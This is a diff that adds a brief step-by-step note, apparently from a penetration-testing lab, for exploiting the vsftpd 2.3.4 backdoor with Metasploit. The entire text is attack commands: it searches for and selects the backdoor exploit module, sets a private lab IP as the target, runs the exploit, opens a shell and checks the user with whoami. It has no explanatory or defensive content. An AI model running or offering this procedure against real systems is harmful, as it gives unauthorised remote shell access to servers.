@@ -1,0 +1,17 @@
+STEP 5 — VSFTPD EXPLOITATION
+
+msfconsole
+
+search vsftpd
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+set RHOSTS 192.168.128.166
+
+show options
+
+exploit
+
+shell
+
+whoami
